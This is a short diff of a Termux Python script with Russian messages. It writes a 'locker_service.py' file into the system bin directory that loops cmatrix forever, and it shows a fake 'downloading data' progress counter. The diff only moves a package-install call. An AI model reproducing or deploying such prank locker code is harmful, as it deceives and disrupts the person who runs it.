@@ -4,7 +4,6 @@ os.system('clear')
 file = open('/data/data/com.termux/files/usr/bin/locker_service.py', 'w')
 file.write("""
 import os
-os.system('pkg install cmatrix')
 while True:
 	os.system('cmatrix')
 """)
@@ -26,6 +25,9 @@ while True:
  	sys.exit()
  else:
  	print('Вы ввели что-то не то.')
+print()
+os.system('pkg install cmatrix')
+print()
 print(Fore.GREEN + 'Скачивание данных...')
 print()
 for percent in range(101):
